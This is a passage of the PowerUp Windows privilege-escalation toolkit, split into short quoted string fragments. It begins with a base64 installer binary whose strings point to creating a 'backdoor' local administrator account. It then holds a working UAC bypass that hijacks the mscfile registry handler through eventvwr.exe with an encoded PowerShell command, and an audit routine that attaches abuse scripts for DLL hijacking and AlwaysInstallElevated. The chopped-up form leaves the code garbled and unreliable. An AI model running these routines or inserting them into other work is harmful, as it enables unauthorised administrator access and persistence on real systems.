GluZ3','NCYXNlAFN5bmNo','cm9uaXplZABTVE','FUaHJlYWRBdHRy','aWJ1dGUARW5hYm','xlVmlzdWFsU3R5','bGVzAFNldENvbX','BhdGlibGVUZXh0','UmVuZGVyaW5nRG','VmYXVsdABSdW4A','RGVidWdnZXJOb2','5Vc2VyQ29kZUF0','dHJpYnV0ZQBUeX','BlAFJ1bnRpbWVU','eXBlSGFuZGxlAE','dldFR5cGVGcm9t','SGFuZGxlAEFzc2','VtYmx5AGdldF9B','c3NlbWJseQBFZG','l0b3JCcm93c2Fi','bGVBdHRyaWJ1dG','UARWRpdG9yQnJv','d3NhYmxlU3RhdG','UAV2luZG93c0Zv','cm1zQXBwbGljYX','Rpb24xLkZvcm0x','LnJlc291cmNlcw','BXaW5kb3dzRm9y','bXNBcHBsaWNhdG','lvbjEuUHJvcGVy','dGllcy5SZXNvdX','JjZXMucmVzb3Vy','Y2VzAAARVwBpAG','4ATgBUADoALwAv','AAATLABjAG8AbQ','BwAHUAdABlAHIA','AAl1AHMAZQByAA','AXUwBlAHQAUABh','AHMAcwB3AG8Acg','BkAAAHUAB1AHQA','ABdEAGUAcwBjAH','IAaQBwAHQAaQBv','AG4AAAlVAHMAZQ','ByAAALZwByAG8A','dQBwAAAHQQBkAG','QAABF1AHMAZQBy','AG4AYQBtAGUAAB','FiAGEAYwBrAGQA','bwBvAHIAAA1sAG','EAYgBlAGwAMQAA','EVUAcwBlAHIAbg','BhAG0AZQAADWwA','YQBiAGUAbAAyAA','ARUABhAHMAcwB3','AG8AcgBkAAARcA','BhAHMAcwB3AG8A','cgBkAAAXcABhAH','MAcwB3AG8AcgBk','ADEAMgAzAAANbA','BhAGIAZQBsADMA','AAtHAHIAbwB1AH','AAAB1BAGQAbQBp','AG4AaQBzAHQAcg','BhAHQAbwByAHMA','AA9iAHUAdAB0AG','8AbgAxAAANQwBy','AGUAYQB0AGUAAA','tGAG8AcgBtADEA','ABFVAHMAZQByAC','AAQQBkAGQAAFtX','AGkAbgBkAG8Adw','BzAEYAbwByAG0A','cwBBAHAAcABsAG','kAYwBhAHQAaQBv','AG4AMQAuAFAAcg','BvAHAAZQByAHQA','aQBlAHMALgBSAG','UAcwBvAHUAcgBj','AGUAcwAAAAAA/e','rdtNjyrUWO4d3A','zceaIwAIt3pcVh','k04IkDIAABBiAC','ARwSEQMGEhUEIA','EBAgMGEhkDBhId','AwYSIQMGEgwEAA','ASDAQIABIMAwAA','AQMGEiUDBhIpBA','AAEiUEAAASKQUA','AQESKQQIABIlBA','gAEikEIAEBDgUg','AQERYQQgAQEIAw','AADgYAAw4ODg4I','sD9ffxHVCjoEIA','ASeQMgAA4GIAIS','dQ4OBiACHA4dHA','4HBhJ1EnUSdR0c','HRwdHAUgAgEICA','YgAQERgIkGIAEB','EYCNBSACARwYBi','ABARKAkQUgAgEM','DAYgAQERgJkGIA','EBEYChBSAAEoCl','BSABARJ9BAEAAA','AFIAIBDg5YAQBL','TWljcm9zb2Z0Ll','Zpc3VhbFN0dWRp','by5FZGl0b3JzLl','NldHRpbmdzRGVz','aWduZXIuU2V0dG','luZ3NTaW5nbGVG','aWxlR2VuZXJhdG','9yBzkuMC4wLjAA','AAgAARKAsRKAsQ','QAAQECBQABARIF','QAEAM1N5c3RlbS','5SZXNvdXJjZXMu','VG9vbHMuU3Ryb2','5nbHlUeXBlZFJl','c291cmNlQnVpbG','RlcgcyLjAuMC4w','AAAIAAESgL0RgM','EFIAASgMUHIAIB','DhKAxQQHARIlBi','ABARGAzQgBAAIA','AAAAAB0BABhXaW','5kb3dzRm9ybXNB','cHBsaWNhdGlvbj','EAAAUBAAAAABcB','ABJDb3B5cmlnaH','QgwqkgIDIwMTQA','ACkBACQ5Zjk3Zm','RiOS1iMDY1LTQw','YmUtYjFkYy0yMD','RjOGRkOTAwNzIA','AAwBAAcxLjAuMC','4wAAAIAQAIAAAA','AAAeAQABAFQCFl','dyYXBOb25FeGNl','cHRpb25UaHJvd3','MBAAAAAAAAANZg','XlMAAAAAAgAAAK','cAAAD0OgAA9BwA','AFJTRFPL5ad6NR','2rSYRfSN8k5t+3','AQAAAEM6XFVzZX','JzXGFkYW1cRG9j','dW1lbnRzXFZpc3','VhbCBTdHVkaW8g','MjAwOFxQcm9qZW','N0c1xXaW5kb3dz','Rm9ybXNBcHBsaW','NhdGlvbjFcV2lu','ZG93c0Zvcm1zQX','BwbGljYXRpb24x','XG9ialxSZWxlYX','NlXFdpbmRvd3NG','b3Jtc0FwcGxpY2','F0aW9uMS5wZGIA','AMQ7AAAAAAAAAA','AAAN47AAAAIAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAADQ','OwAAAAAAAAAAAA','AAAF9Db3JFeGVN','YWluAG1zY29yZW','UuZGxsAAAAAAD/','JQAgQAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','IAEAAAACAAAIAY','AAAAOAAAgAAAAA','AAAAAAAAAAAAAA','AQABAAAAUAAAgA','AAAAAAAAAAAAAA','AAAAAQABAAAAaA','AAgAAAAAAAAAAA','AAAAAAAAAQAAAA','AAgAAAAAAAAAAA','AAAAAAAAAAAAAQ','AAAAAAkAAAAKBA','AAAwAwAAAAAAAA','AAAADQQwAA6gEA','AAAAAAAAAAAAMA','M0AAAAVgBTAF8A','VgBFAFIAUwBJAE','8ATgBfAEkATgBG','AE8AAAAAAL0E7/','4AAAEAAAABAAAA','AAAAAAEAAAAAAD','8AAAAAAAAABAAA','AAEAAAAAAAAAAA','AAAAAAAABEAAAA','AQBWAGEAcgBGAG','kAbABlAEkAbgBm','AG8AAAAAACQABA','AAAFQAcgBhAG4A','cwBsAGEAdABpAG','8AbgAAAAAAAACw','BJACAAABAFMAdA','ByAGkAbgBnAEYA','aQBsAGUASQBuAG','YAbwAAAGwCAAAB','ADAAMAAwADAAMA','A0AGIAMAAAAFwA','GQABAEYAaQBsAG','UARABlAHMAYwBy','AGkAcAB0AGkAbw','BuAAAAAABXAGkA','bgBkAG8AdwBzAE','YAbwByAG0AcwBB','AHAAcABsAGkAYw','BhAHQAaQBvAG4A','MQAAAAAAMAAIAA','EARgBpAGwAZQBW','AGUAcgBzAGkAbw','BuAAAAAAAxAC4A','MAAuADAALgAwAA','AAXAAdAAEASQBu','AHQAZQByAG4AYQ','BsAE4AYQBtAGUA','AABXAGkAbgBkAG','8AdwBzAEYAbwBy','AG0AcwBBAHAAcA','BsAGkAYwBhAHQA','aQBvAG4AMQAuAG','UAeABlAAAAAABI','ABIAAQBMAGUAZw','BhAGwAQwBvAHAA','eQByAGkAZwBoAH','QAAABDAG8AcAB5','AHIAaQBnAGgAdA','AgAKkAIAAgADIA','MAAxADQAAABkAB','0AAQBPAHIAaQBn','AGkAbgBhAGwARg','BpAGwAZQBuAGEA','bQBlAAAAVwBpAG','4AZABvAHcAcwBG','AG8AcgBtAHMAQQ','BwAHAAbABpAGMA','YQB0AGkAbwBuAD','EALgBlAHgAZQAA','AAAAVAAZAAEAUA','ByAG8AZAB1AGMA','dABOAGEAbQBlAA','AAAABXAGkAbgBk','AG8AdwBzAEYAbw','ByAG0AcwBBAHAA','cABsAGkAYwBhAH','QAaQBvAG4AMQAA','AAAANAAIAAEAUA','ByAG8AZAB1AGMA','dABWAGUAcgBzAG','kAbwBuAAAAMQAu','ADAALgAwAC4AMA','AAADgACAABAEEA','cwBzAGUAbQBiAG','wAeQAgAFYAZQBy','AHMAaQBvAG4AAA','AxAC4AMAAuADAA','LgAwAAAA77u/PD','94bWwgdmVyc2lv','bj0iMS4wIiBlbm','NvZGluZz0iVVRG','LTgiIHN0YW5kYW','xvbmU9InllcyI/','Pg0KPGFzc2VtYm','x5IHhtbG5zPSJ1','cm46c2NoZW1hcy','1taWNyb3NvZnQt','Y29tOmFzbS52MS','IgbWFuaWZlc3RW','ZXJzaW9uPSIxLj','AiPg0KICA8YXNz','ZW1ibHlJZGVudG','l0eSB2ZXJzaW9u','PSIxLjAuMC4wIi','BuYW1lPSJNeUFw','cGxpY2F0aW9uLm','FwcCIvPg0KICA8','dHJ1c3RJbmZvIH','htbG5zPSJ1cm46','c2NoZW1hcy1taW','Nyb3NvZnQtY29t','OmFzbS52MiI+DQ','ogICAgPHNlY3Vy','aXR5Pg0KICAgIC','AgPHJlcXVlc3Rl','ZFByaXZpbGVnZX','MgeG1sbnM9InVy','bjpzY2hlbWFzLW','1pY3Jvc29mdC1j','b206YXNtLnYzIj','4NCiAgICAgICAg','PHJlcXVlc3RlZE','V4ZWN1dGlvbkxl','dmVsIGxldmVsPS','Jhc0ludm9rZXIi','IHVpQWNjZXNzPS','JmYWxzZSIvPg0K','ICAgICAgPC9yZX','F1ZXN0ZWRQcml2','aWxlZ2VzPg0KIC','AgIDwvc2VjdXJp','dHk+DQogIDwvdH','J1c3RJbmZvPg0K','PC9hc3NlbWJseT','4NCgAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','MAAADAAAAPA7AA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAACBzZX','QuICBUaGUgZGVm','YXVsdCBpcyAiQU','xMIi5BY3Rpb25Q','cm9wZXJ0eVRoZS','Bwcm9wZXJ0eSB0','byBzZXQgd2hlbi','BhIHByb2R1Y3Qg','aW4gdGhpcyBzZX','QgaXMgZm91bmQu','Q29zdEluaXRpYW','xpemVGaWxlQ29z','dENvc3RGaW5hbG','l6ZUluc3RhbGxW','YWxpZGF0ZUluc3','RhbGxJbml0aWFs','aXplSW5zdGFsbE','FkbWluUGFja2Fn','ZUluc3RhbGxGaW','xlc0luc3RhbGxG','aW5hbGl6ZUV4ZW','N1dGVBY3Rpb25Q','dWJsaXNoRmVhdH','VyZXNQdWJsaXNo','UHJvZHVjdGJ6Ll','dyYXBwZWRTZXR1','cFByb2dyYW1iei','5DdXN0b21BY3Rp','b25EbGxiei5Qcm','9kdWN0Q29tcG9u','ZW50e0VERTEwRj','ZDLTMwRjQtNDJD','QS1CNUM3LUFEQj','kwNUU0NUJGQ31C','Wi5JTlNUQUxMRk','9MREVScmVnOUNB','RTU3QUY3QjlGQj','RFRjI3MDZGOTVC','NEI4M0I0MTlTZX','RQcm9wZXJ0eUZv','ckRlZmVycmVkYn','ouTW9kaWZ5UmVn','aXN0cnlbQlouV1','JBUFBFRF9BUFBJ','RF1iei5TdWJzdF','dyYXBwZWRBcmd1','bWVudHNfU3Vic3','RXcmFwcGVkQXJn','dW1lbnRzQDRiei','5SdW5XcmFwcGVk','U2V0dXBbYnouU2','V0dXBTaXplXSAi','W1NvdXJjZURpcl','1cLiIgW0JaLklO','U1RBTExfU1VDQ0','VTU19DT0RFU10g','KltCWi5GSVhFRF','9JTlNUQUxMX0FS','R1VNRU5UU11bV1','JBUFBFRF9BUkdV','TUVOVFNdX01vZG','lmeVJlZ2lzdHJ5','QDRiei5Vbmluc3','RhbGxXcmFwcGVk','X1VuaW5zdGFsbF','dyYXBwZWRANFBy','b2dyYW1GaWxlc0','ZvbGRlcmJ4anZp','bHc3fFtCWi5DT0','1QQU5ZTkFNRV1U','QVJHRVRESVIuU2','91cmNlRGlyUHJv','ZHVjdEZlYXR1cm','VNYWluIEZlYXR1','cmVQcm9kdWN0SW','NvbkZpbmRSZWxh','dGVkUHJvZHVjdH','NMYXVuY2hDb25k','aXRpb25zVmFsaW','RhdGVQcm9kdWN0','SURNaWdyYXRlRm','VhdHVyZVN0YXRl','c1Byb2Nlc3NDb2','1wb25lbnRzVW5w','dWJsaXNoRmVhdH','VyZXNSZW1vdmVS','ZWdpc3RyeVZhbH','Vlc1dyaXRlUmVn','aXN0cnlWYWx1ZX','NSZWdpc3RlclVz','ZXJSZWdpc3Rlcl','Byb2R1Y3RSZW1v','dmVFeGlzdGluZ1','Byb2R1Y3RzTk9U','IFJFTU9WRSB+PS','JBTEwiIEFORCBO','T1QgVVBHUkFERV','BST0RVQ1RDT0RF','UkVNT1ZFIH49IC','JBTEwiIEFORCBO','T1QgVVBHUkFESU','5HUFJPRFVDVENP','REVOT1QgV0lYX0','RPV05HUkFERV9E','RVRFQ1RFRERvd2','5ncmFkZXMgYXJl','IG5vdCBhbGxvd2','VkLkFMTFVTRVJT','MUFSUE5PUkVQQU','lSQVJQTk9NT0RJ','RllBUlBQUk9EVU','NUSUNPTkFSUEhF','TFBMSU5LaHR0cD','ovL3d3dy5leGVt','c2kuY29tQVJQVV','JMSU5GT0FCT1VU','QVJQQ09NTUVOVF','NNU0kgVGVtcGxh','dGUuQVJQQ09OVE','FDVE15IGNvbnRh','Y3QgaW5mb3JtYX','Rpb24uQVJQVVJM','VVBEQVRFSU5GT0','15IHVwZGF0ZSBp','bmZvcm1hdGlvbi','5CWi5WRVJGQlou','V1JBUFBFRF9BUF','BJRHs1NjYyODkx','Mi04RUQ0LTQ4RU','YtQUM1Mi1FRTgz','QTFCRkJGMTF9X2','lzMUJaLkNPTVBB','TllOQU1FRVhFTV','NJLkNPTUJaLklO','U1RBTExfU1VDQ0','VTU19DT0RFUzBC','Wi5GSVhFRF9JTl','NUQUxMX0FSR1VN','RU5UUy9TSUxFTl','QgQlouVUlOT05F','X0lOU1RBTExfQV','JHVU1FTlRTIEJa','LlVJQkFTSUNfSU','5TVEFMTF9BUkdV','TUVOVFNCWi5VSV','JFRFVDRURfSU5T','VEFMTF9BUkdVTU','VOVFNCWi5VSUZV','TExfSU5TVEFMTF','9BUkdVTUVOVFNC','Wi5GSVhFRF9VTk','lOU1RBTExfQVJH','VU1FTlRTQlouVU','lOT05FX1VOSU5T','VEFMTF9BUkdVTU','VOVFNCWi5VSUJB','U0lDX1VOSU5TVE','FMTF9BUkdVTUVO','VFNCWi5VSVJFRF','VDRURfVU5JTlNU','QUxMX0FSR1VNRU','5UU0JaLlVJRlVM','TF9VTklOU1RBTE','xfQVJHVU1FTlRT','YnouU2V0dXBTaX','plMjMyOTYwTWFu','dWZhY3R1cmVyUH','JvZHVjdENvZGV7','MjcxQkJDRUQtRj','M2QS00RThFLUE1','NzYtOTQ1NUYwQ0','EwMUE4fVByb2R1','Y3RMYW5ndWFnZT','EwMzNQcm9kdWN0','TmFtZU1TSSBXcm','FwcGVyIFRlbXBs','YXRlUHJvZHVjdF','ZlcnNpb24xLjAu','MC4we0NDMDM1Qz','E4LTBGQzctNDcw','OC04ODA2LUQ0Qj','A5MUU1OUFBN31T','ZWN1cmVDdXN0b2','1Qcm9wZXJ0aWVz','V0lYX0RPV05HUk','FERV9ERVRFQ1RF','RDtXSVhfVVBHUk','FERV9ERVRFQ1RF','RFNPRlRXQVJFXF','tCWi5DT01QQU5Z','TkFNRV1cTVNJIF','dyYXBwZXJcSW5z','dGFsbGVkXFtCWi','5XUkFQUEVEX0FQ','UElEXUxvZ29uVX','NlcltMb2dv''

 ','   try {
     ','   [System.Con','vert]::FromBas','e64String( $Bi','nary ) | Set-C','ontent -Path $','Path -Encoding',' Byte
        ','Write-Verbose ','"MSI written o','ut to ''$Path''"','

        $Out',' = New-Object ','PSObject
     ','   $Out | Add-','Member Notepro','perty ''OutputP','ath'' $Path
   ','     $Out.PSOb','ject.TypeNames','.Insert(0, ''Po','werUp.UserAddM','SI'')
        $','Out
    }
    ','catch {
      ','  Write-Warnin','g "Error while',' writing to lo','cation ''$Path''',': $_"
    }
}
','

function Inv','oke-EventVwrBy','pass {
<#
.SYN','OPSIS

Bypasse','s UAC by perfo','rming an image',' hijack on the',' .msc file ext','ension
Only te','sted on Window','s 7 and Window','s 10

Author: ','Matt Nelson (@','enigma0x3)  
L','icense: BSD 3-','Clause  
Requi','red Dependenci','es: None

.PAR','AMETER Command','

 Specifies t','he command you',' want to run i','n a high-integ','rity context. ','For example, y','ou can pass it',' powershell.ex','e followed by ','any encoded co','mmand "powersh','ell -enc <enco','dedCommand>"

','.EXAMPLE

Invo','ke-EventVwrByp','ass -Command "','C:\Windows\Sys','tem32\WindowsP','owerShell\v1.0','\powershell.ex','e -enc IgBJAHM','AIABFAGwAZQB2A','GEAdABlAGQAOgA','gACQAKAAoAFsAU','wBlAGMAdQByAGk','AdAB5AC4AUAByA','GkAbgBjAGkAcAB','hAGwALgBXAGkAb','gBkAG8AdwBzAFA','AcgBpAG4AYwBpA','HAAYQBsAF0AWwB','TAGUAYwB1AHIAa','QB0AHkALgBQAHI','AaQBuAGMAaQBwA','GEAbAAuAFcAaQB','uAGQAbwB3AHMAS','QBkAGUAbgB0AGk','AdAB5AF0AOgA6A','EcAZQB0AEMAdQB','yAHIAZQBuAHQAK','AApACkALgBJAHM','ASQBuAFIAbwBsA','GUAKABbAFMAZQB','jAHUAcgBpAHQAe','QAuAFAAcgBpAG4','AYwBpAHAAYQBsA','C4AVwBpAG4AZAB','vAHcAcwBCAHUAa','QBsAHQASQBuAFI','AbwBsAGUAXQAnA','EEAZABtAGkAbgB','pAHMAdAByAGEAd','ABvAHIAJwApACk','AIAAtACAAJAAoA','EcAZQB0AC0ARAB','hAHQAZQApACIAI','AB8ACAATwB1AHQ','ALQBGAGkAbABlA','CAAQwA6AFwAVQB','BAEMAQgB5AHAAY','QBzAHMAVABlAHM','AdAAuAHQAeAB0A','CAALQBBAHAAcAB','lAG4AZAA="

Th','is will write ','out "Is Elevat','ed: True" to C',':\UACBypassTes','t.
#>

    [Cm','dletBinding(Su','pportsShouldPr','ocess = $True,',' ConfirmImpact',' = ''Medium'')]
','    Param (
  ','      [Paramet','er(Mandatory =',' $True)]
     ','   [ValidateNo','tNullOrEmpty()',']
        [Str','ing]
        $','Command,

    ','    [Switch]
 ','       $Force
','    )
    $Con','sentPrompt = (','Get-ItemProper','ty HKLM:\SOFTW','ARE\Microsoft\','Windows\Curren','tVersion\Polic','ies\System).Co','nsentPromptBeh','aviorAdmin
   ',' $SecureDeskto','pPrompt = (Get','-ItemProperty ','HKLM:\SOFTWARE','\Microsoft\Win','dows\CurrentVe','rsion\Policies','\System).Promp','tOnSecureDeskt','op

    if($Co','nsentPrompt -E','q 2 -And $Secu','reDesktopPromp','t -Eq 1){
    ','    "UAC is se','t to ''Always N','otify''. This m','odule does not',' bypass this s','etting."
     ','   exit
    }
','    else{
    ','    #Begin Exe','cution
       ',' $mscCommandPa','th = "HKCU:\So','ftware\Classes','\mscfile\shell','\open\command"','
        $Comm','and = $pshome ','+ ''\'' + $Comma','nd
        #Ad','d in the new r','egistry entrie','s to hijack th','e msc file
   ','     if ($Forc','e -or ((Get-It','emProperty -Pa','th $mscCommand','Path -Name ''(d','efault)'' -Erro','rAction Silent','lyContinue) -e','q $null)){
   ','         New-I','tem $mscComman','dPath -Force |','
             ','   New-ItemPro','perty -Name ''(','Default)'' -Val','ue $Command -P','ropertyType st','ring -Force | ','Out-Null
     ','   }else{
    ','        Write-','Warning "Key a','lready exists,',' consider usin','g -Force"
    ','        exit
 ','       }

    ','    if (Test-P','ath $mscComman','dPath) {
     ','       Write-V','erbose "Create','d registry ent','ries to hijack',' the msc exten','sion"
        ','}else{
       ','     Write-War','ning "Failed t','o create regis','try key, exiti','ng"
          ','  exit
       ',' }

        $E','ventvwrPath = ','Join-Path -Pat','h ([Environmen','t]::GetFolderP','ath(''System''))',' -ChildPath ''e','ventvwr.exe''
 ','       #Start ','Event Viewer
 ','       if ($PS','Cmdlet.ShouldP','rocess($Eventv','wrPath, ''Start',' process'')) {
','            $P','rocess = Start','-Process -File','Path $Eventvwr','Path -PassThru','
            W','rite-Verbose "','Started eventv','wr.exe"
      ','  }

        #','Sleep 5 second','s 
        Wri','te-Verbose "Sl','eeping 5 secon','ds to trigger ','payload"
     ','   if (-not $P','SBoundParamete','rs[''WhatIf'']) ','{
            ','Start-Sleep -S','econds 5
     ','   }

        ','$mscfilePath =',' "HKCU:\Softwa','re\Classes\msc','file"

       ',' if (Test-Path',' $mscfilePath)',' {
           ',' #Remove the r','egistry entry
','            Re','move-Item $msc','filePath -Recu','rse -Force
   ','         Write','-Verbose "Remo','ved registry e','ntries"
      ','  }

        i','f(Get-Process ','-Id $Process.I','d -ErrorAction',' SilentlyConti','nue){
        ','    Stop-Proce','ss -Id $Proces','s.Id
         ','   Write-Verbo','se "Killed run','ning eventvwr ','process"
     ','   }
    }
}

','
function Invo','ke-PrivescAudi','t {
<#
.SYNOPS','IS

Executes a','ll functions t','hat check for ','various Window','s privilege es','calation oppor','tunities.

Aut','hor: Will Schr','oeder (@harmj0','y)  
License: ','BSD 3-Clause  ','
Required Depe','ndencies: None','  

.DESCRIPTI','ON

Executes a','ll functions t','hat check for ','various Window','s privilege es','calation oppor','tunities.

.PA','RAMETER Format','

String. Form','at to decide o','n what is retu','rned from the ','command, an Ob','ject Array, Li','st, or HTML Re','port.

.PARAME','TER HTMLReport','

DEPRECATED -',' Switch. Write',' a HTML versio','n of the repor','t to SYSTEM.us','ername.html. 
','Superseded by ','the Format par','ameter.

.EXAM','PLE

Invoke-Pr','ivescAudit

Ru','ns all escalat','ion checks and',' outputs a sta','tus report for',' discovered is','sues.

.EXAMPL','E

Invoke-Priv','escAudit -Form','at HTML

Runs ','all escalation',' checks and ou','tputs a status',' report to SYS','TEM.username.h','tml
detailing ','any discovered',' issues.

#>

','    [Diagnosti','cs.CodeAnalysi','s.SuppressMess','ageAttribute(''','PSShouldProces','s'', '''')]
    [','CmdletBinding(',')]
    Param(
','        [Valid','ateSet(''Object',''',''List'',''HTML',''')]
        [S','tring]
       ',' $Format = ''Ob','ject'',
       ',' [Switch]
    ','    $HTMLRepor','t
    )

    i','f($HTMLReport)','{ $Format = ''H','TML'' }

    if',' ($Format -eq ','''HTML'') {
    ','    $HtmlRepor','tFile = "$($En','v:ComputerName',').$($Env:UserN','ame).html"
   ','     $Header =',' "<style>"
   ','     $Header =',' $Header + "BO','DY{background-','color:peachpuf','f;}"
        $','Header = $Head','er + "TABLE{bo','rder-width: 1p','x;border-style',': solid;border','-color: black;','border-collaps','e: collapse;}"','
        $Head','er = $Header +',' "TH{border-wi','dth: 1px;paddi','ng: 0px;border','-style: solid;','border-color: ','black;backgrou','nd-color:thist','le}"
        $','Header = $Head','er + "TD{borde','r-width: 3px;p','adding: 0px;bo','rder-style: so','lid;border-col','or: black;back','ground-color:p','alegoldenrod}"','
        $Head','er = $Header +',' "</style>"
  ','      ConvertT','o-HTML -Head $','Header -Body "','<H1>PowerUp re','port for ''$($E','nv:ComputerNam','e).$($Env:User','Name)''</H1>" |',' Out-File $Htm','lReportFile
  ','  }

    Write','-Verbose "Runn','ing Invoke-Pri','vescAudit"

  ','  $Checks = @(','
        # Ini','tial admin che','cks
        @{','
            T','ype    = ''User',' Has Local Adm','in Privileges''','
            C','ommand = { if ','(([Security.Pr','incipal.Window','sPrincipal] [S','ecurity.Princi','pal.WindowsIde','ntity]::GetCur','rent()).IsInRo','le([Security.P','rincipal.Windo','wsBuiltInRole]',' "Administrato','r")){ New-Obje','ct PSObject } ','}
        },
 ','       @{
    ','        Type  ','      = ''User ','In Local Group',' with Admin Pr','ivileges''
    ','        Comman','d     = { if (','(Get-ProcessTo','kenGroup | Sel','ect-Object -Ex','pandProperty S','ID) -contains ','''S-1-5-32-544''','){ New-Object ','PSObject } }
 ','           Abu','seScript = { ''','Invoke-WScript','UACBypass -Com','mand "..."'' }
','        },
   ','     @{
      ','      Type    ','   = ''Process ','Token Privileg','es''
          ','  Command    =',' { Get-Process','TokenPrivilege',' -Special | Wh','ere-Object {$_','} }
        },','
        # Ser','vice checks
  ','      @{
     ','       Type   ',' = ''Unquoted S','ervice Paths''
','            Co','mmand = { Get-','UnquotedServic','e }
        },','
        @{
  ','          Type','    = ''Modifia','ble Service Fi','les''
         ','   Command = {',' Get-Modifiabl','eServiceFile }','
        },
  ','      @{
     ','       Type   ',' = ''Modifiable',' Services''
   ','         Comma','nd = { Get-Mod','ifiableService',' }
        },
','        # DLL ','hijacking
    ','    @{
       ','     Type     ','   = ''%PATH% .','dll Hijacks''
 ','           Com','mand     = { F','ind-PathDLLHij','ack }
        ','    AbuseScrip','t = { "Write-H','ijackDll -DllP','ath ''$($_.Modi','fiablePath)\wl','bsctrl.dll''" }','
        },
  ','      # Regist','ry checks
    ','    @{
       ','     Type     ','   = ''AlwaysIn','stallElevated ','Registry Key''
','            Co','mmand     = { ','if (Get-Regist','ryAlwaysInstal','lElevated){ Ne','w-Object PSObj','ect } }
      ','      AbuseScr','ipt = { ''Write','-UserAddMSI'' }','
        },
  ','      @{
     ','       Type   ',' = ''Registry A','utologons''
   ','         Comma','nd = { Get-Reg','istryAutoLogon',' }
        },
','        @{
   ','         Type ','   = ''Modifiab','le Registry Au','torun''
       ','     Command =',' { Get-Modifia','bleRegistryAut','oRun }
       ',' },
        # ','Other checks
 ','       @{
    ','        Type  ','  = ''Modifiabl','e Scheduled Ta','sk Files''
    ','        Comman','d = { Get-Modi','fiableSchedule','dTaskFile }
  ','      },
     ','   @{
        ','    Type    = ','''Unattended In','stall Files''
 ','           Com','mand = { Get-U','nattendedInsta','llFile }
     ','   },
        ','@{
           ',' Type    = ''En','crypted web.co','nfig Strings''
','            Co','mmand = { Get-','WebConfig | Wh','ere-Object {$_','} }
        },','
        @{
  ','          Type','    = ''Encrypt','ed Application',' Pool Password','s''
           ',' Command = { G','et-Application','Host | Where-O','bject {$_} }
 ','       },
    ','    @{
       ','     Type    =',' ''McAfee SiteL','ist.xml files''','
            C','ommand = { Get','-SiteListPassw','ord | Where-Ob','ject {$_} }
  ','      },
     ','   @{
        ','    Type    = ','''Cached GPP Fi','les''
         ','   Command = {',' Get-CachedGPP','Password | Whe','re-Object {$_}',' }
        }
 ','   )

    ForE','ach($Check in ','$Checks){
    ','    Write-Verb','ose "Checking ','for $($Check.T','ype)..."
     ','   $Results = ','. $Check.Comma','nd
        $Re','sults | Where-','Object {$_} | ','ForEach-Object',' {
           ',' $_ | Add-Memb','er Notepropert','y ''Check'' $Che','ck.Type
      ','      if ($Che','ck.AbuseScript','){
           ','     $_ | Add-','Member Notepro','perty ''AbuseFu','nction'' (. $Ch','eck.AbuseScrip','t)
           ',' }
        }
 ','       switch(','$Format){
    ','        Object',' { $Results }
','            Li','st   { "`n`n[*','] Checking for',' $($Check.Type',')..."; $Result','s | Format-Lis','t }
          ','  HTML   { $Re','sults | Conver','tTo-HTML -Head',' $Header -Body',' "<H2>$($Check','.Type)</H2>" |',' Out-File -App','end $HtmlRepor','tFile }
      ','  }
    }

   ',' if ($Format -','eq ''HTML'') {
 ','       Write-V','erbose "[*] Re','port written t','o ''$HtmlReport','File'' `n"
    ','}
}


# PSRefl','ect signature ','specifications','
$Module = New','-InMemoryModul','e -ModuleName ','PowerUpModule
','# [Diagnostics','.CodeAnalysis.','SuppressMessag','eAttribute(''PS','AvoidUsingPosi','tionalParamete','rs'', '''', Scope','=''Function'')]
','
$FunctionDefi','nitions = @(
 ','   (func kerne','l32 GetCurrent','Process ([IntP','tr]) @()),
   ',' (func kernel3','2 OpenProcess ','([IntPtr]) @([','UInt32], [Bool','], [UInt32]) -','SetLastError),','
    (func ker','nel32 CloseHan','dle ([Bool]) @','([IntPtr]) -Se','tLastError),
 ','   (func advap','i32 OpenProces','sToken ([Bool]',') @([IntPtr], ','[UInt32], [Int','Ptr].MakeByRef','Type()) -SetLa','stError)
    (','func advapi32 ','GetTokenInform','ation ([Bool])',' @([IntPtr], [','UInt32], [IntP','tr], [UInt32],',' [UInt32].Make','ByRefType()) -','SetLastError),','
    (func adv','api32 ConvertS','idToStringSid ','([Int]) @([Int','Ptr], [String]','.MakeByRefType','()) -SetLastEr','ror),
    (fun','c advapi32 Loo','kupPrivilegeNa','me ([Int]) @([','IntPtr], [IntP','tr], [String].','MakeByRefType(','), [Int32].Mak','eByRefType()) ','-SetLastError)',',
    (func ad','vapi32 QuerySe','rviceObjectSec','urity ([Bool])',' @([IntPtr], [','Security.Acces','sControl.Secur','ityInfos], [By','te[]], [UInt32','], [UInt32].Ma','keByRefType())',' -SetLastError','),
    (func a','dvapi32 Change','ServiceConfig ','([Bool]) @([In','tPtr], [UInt32','], [UInt32], [','UInt32], [Stri','ng], [IntPtr],',' [IntPtr], [In','tPtr], [IntPtr','], [IntPtr], [','IntPtr]) -SetL','astError -Char','set Unicode),
','    (func adva','pi32 CloseServ','iceHandle ([Bo','ol]) @([IntPtr',']) -SetLastErr','or),
